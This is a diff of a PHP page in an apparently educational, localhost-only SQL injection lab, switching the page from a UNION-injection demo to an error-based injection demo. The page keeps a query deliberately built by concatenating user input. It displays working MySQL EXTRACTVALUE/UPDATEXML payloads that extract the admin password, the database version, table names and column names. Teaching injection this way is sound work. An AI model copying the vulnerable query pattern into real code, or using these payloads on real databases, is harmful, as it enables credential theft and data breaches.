@@ -1,37 +1,31 @@
 <?php
 // ============================================================
-// read_vulnerable.php - Data Extraction Demo (OR 1=1 + UNION)
+// error_based_vulnerable.php - Error-Based SQL Injection Demo
 // SQL Injection Educational Lab
 // FOR EDUCATIONAL PURPOSES ONLY - localhost only
 // ============================================================
 //
-// VULNERABILITY 1: OR-based injection (dump all rows)
-// ---------------------------------------------------
-// The search query uses string concatenation. By injecting
-//   ' OR '1'='1
-// the WHERE clause always evaluates to TRUE, returning every row.
+// VULNERABILITY: Error-based SQL injection using EXTRACTVALUE/UPDATEXML
+// --------------------------------------------------------------------
+// When error messages are displayed to the user, an attacker can
+// force MySQL to include data inside the error message itself.
 //
-// Original query:
-//   SELECT * FROM users WHERE username='<input>'
-// Injected query:
-//   SELECT * FROM users WHERE username='' OR '1'='1'
+// Functions used:
+//   EXTRACTVALUE(xml, xpath)  - returns an error if xpath is invalid
+//   UPDATEXML(xml, xpath, value) - same behavior
 //
+// Example payload:
+//   ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users WHERE username='admin'))) --
 //
-// VULNERABILITY 2: UNION-based injection (extract specific data)
-// --------------------------------------------------------------
-// UNION SELECT lets an attacker append a second query to extract
-// data from any column or even other tables.
+// MySQL will throw an error like:
+//   XPATH syntax error: '~admin123'
 //
-// Payload:
-//   ' UNION SELECT id, username, password, role FROM users --
-//
-// The attacker can also probe the MySQL metadata:
-//   ' UNION SELECT 1, table_name, column_name, 4 FROM information_schema.columns WHERE table_schema='sql_injection_lab' --
+// The attacker just extracted the admin password from the error message!
 // ============================================================
 
 require_once 'db.php';
 require_once 'lang_switcher.php';
-$_SESSION['visited_labs'][] = 'read_vulnerable'; $_SESSION['visited_labs'] = array_unique($_SESSION['visited_labs']);
+$_SESSION['visited_labs'][] = 'error_based_vulnerable'; $_SESSION['visited_labs'] = array_unique($_SESSION['visited_labs']);
 
 $result  = null;
 $error   = null;
@@ -40,9 +34,7 @@ $query   = '';
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $search = $_POST['search'] ?? '';
 
-    // =====================================================
     // VULNERABLE: Direct string concatenation
-    // =====================================================
     $query = "SELECT * FROM users WHERE username='$search'";
 
     try {
@@ -55,11 +47,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 }
 ?>
 <!DOCTYPE html>
-<html lang="en">
+<html lang="<?= t('lang_code') ?>">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title><?= t('data_extract_page') ?></title>
+    <title><?= t('errorbased_page') ?></title>
     <style>
         <?= langSwitcherCSS() ?>
         * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -70,7 +62,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         h1 { color: #ff5252; margin: 16px 0 4px; }
         .tag { display: inline-block; background: #b71c1c; color: #fff; font-size: 0.7rem; padding: 2px 8px; border-radius: 4px; text-transform: uppercase; font-weight: bold; margin-bottom: 16px; }
         .info-box { background: #1a1a2e; border: 1px solid #2a2a4a; border-radius: 8px; padding: 16px; margin-bottom: 24px; line-height: 1.6; font-size: 0.9rem; }
-        .info-box code { display: block; background: #0d0d1a; padding: 6px 10px; border-radius: 4px; color: #ff8a80; margin: 6px 0; font-size: 0.85rem; }
+        .info-box code { display: block; background: #0d0d1a; padding: 6px 10px; border-radius: 4px; color: #ff8a80; margin: 6px 0; font-size: 0.82rem; word-break: break-all; }
         form { background: #1a1a2e; border: 1px solid #2a2a4a; border-radius: 8px; padding: 24px; margin-bottom: 24px; }
         label { display: block; margin-bottom: 6px; font-size: 0.9rem; color: #aaa; }
         input[type="text"] {
@@ -86,32 +78,44 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         table { width: 100%; border-collapse: collapse; }
         th, td { text-align: left; padding: 8px 12px; border-bottom: 1px solid #2a2a4a; font-size: 0.88rem; }
         th { color: #888; }
-        .error { color: #ff5252; background: #1a1a2e; padding: 12px; border-radius: 6px; }
+        .error-display { color: #ff5252; background: #1a0000; padding: 16px; border-radius: 8px; border: 1px solid #c62828; font-family: 'Courier New', monospace; font-size: 0.85rem; word-break: break-all; margin-bottom: 16px; }
+        .error-display .highlight { background: #ffab4033; color: #ffab40; padding: 2px 4px; border-radius: 3px; font-weight: bold; }
+        .technique-box { background: #1a1a2e; border: 1px solid #2a2a4a; border-radius: 8px; padding: 16px; margin-bottom: 24px; }
+        .technique-box h3 { color: #00e5ff; margin-bottom: 12px; font-size: 1rem; }
+        .technique-box table { width: 100%; border-collapse: collapse; }
+        .technique-box th, .technique-box td { text-align: left; padding: 6px 10px; border-bottom: 1px solid #2a2a4a; font-size: 0.82rem; }
+        .technique-box th { color: #888; }
+        .technique-box td code { color: #ff8a80; }
     </style>
 </head>
 <body>
 <?= langSwitcherHTML() ?>
 <div class="container">
     <a class="back" href="index.php"><?= t('back_to_menu') ?></a>
-    <h1><?= t('data_extract_title') ?></h1>
+    <h1><?= t('errorbased_title') ?></h1>
     <span class="tag"><?= t('vulnerable') ?></span>
 
     <!-- Explanation -->
     <div class="info-box">
-        <?= t('lab_a') ?>
-        <code>' OR '1'='1</code>
+        <?= t('errorbased_what') ?><br><br>
+        <?= t('errorbased_technique') ?>
 
-        <?= t('lab_b') ?>
-        <code>' UNION SELECT id, username, password, role FROM users -- </code>
+        <strong><?= t('errorbased_extractvalue') ?></strong>
+        <code>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users WHERE username='admin'))) -- </code>
 
-        <?= t('lab_c') ?>
-        <code>' UNION SELECT 1, table_name, column_name, table_schema FROM information_schema.columns WHERE table_schema='sql_injection_lab' -- </code>
+        <strong><?= t('errorbased_updatexml') ?></strong>
+        <code>' AND UPDATEXML(1, CONCAT(0x7e, (SELECT password FROM users WHERE username='admin')), 1) -- </code>
+
+        <strong><?= t('errorbased_db_version') ?></strong>
+        <code>' AND EXTRACTVALUE(1, CONCAT(0x7e, version())) -- </code>
     </div>
 
     <!-- Search Form -->
     <form method="POST">
         <label for="search"><?= t('search_by_username') ?></label>
-        <input type="text" id="search" name="search" placeholder="e.g. admin  or  ' OR '1'='1" value="<?= htmlspecialchars($_POST['search'] ?? '') ?>">
+        <input type="text" id="search" name="search"
+               placeholder="' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1))) -- "
+               value="<?= htmlspecialchars($_POST['search'] ?? '') ?>">
         <button type="submit"><?= t('search_btn') ?></button>
     </form>
 
@@ -124,7 +128,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
         <div class="result-box">
             <?php if ($error): ?>
-                <p class="error"><strong><?= t('sql_error') ?></strong> <?= htmlspecialchars($error) ?></p>
+                <h3 style="color:#ff5252; margin-bottom:12px;"><?= t('errorbased_error_title') ?></h3>
+                <div class="error-display">
+                    <?php
+                    // Highlight extracted data in error (text after ~ character)
+                    $errorHtml = htmlspecialchars($error);
+                    $errorHtml = preg_replace('/~([^\']+)/', '~<span class="highlight">$1</span>', $errorHtml);
+                    echo $errorHtml;
+                    ?>
+                </div>
+                <p style="color:#ffab40; font-size:0.85rem;">
+                    &#9888; <?= t('errorbased_data_in_error') ?>
+                </p>
 
             <?php elseif ($result && count($result) > 0): ?>
                 <h3><?= count($result) ?> <?= t('rows_returned') ?></h3>
@@ -148,6 +163,30 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             <?php endif; ?>
         </div>
     <?php endif; ?>
+
+    <!-- Techniques Reference -->
+    <div class="technique-box">
+        <h3><?= t('errorbased_ref_title') ?></h3>
+        <table>
+            <tr><th><?= t('errorbased_goal') ?></th><th><?= t('payload') ?></th></tr>
+            <tr>
+                <td><?= t('errorbased_goal_password') ?></td>
+                <td><code>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users WHERE username='admin'))) -- </code></td>
+            </tr>
+            <tr>
+                <td><?= t('errorbased_goal_version') ?></td>
+                <td><code>' AND EXTRACTVALUE(1, CONCAT(0x7e, version())) -- </code></td>
+            </tr>
+            <tr>
+                <td><?= t('errorbased_goal_tables') ?></td>
+                <td><code>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))) -- </code></td>
+            </tr>
+            <tr>
+                <td><?= t('errorbased_goal_columns') ?></td>
+                <td><code>' AND UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users')), 1) -- </code></td>
+            </tr>
+        </table>
+    </div>
 </div>
 </body>
 </html>
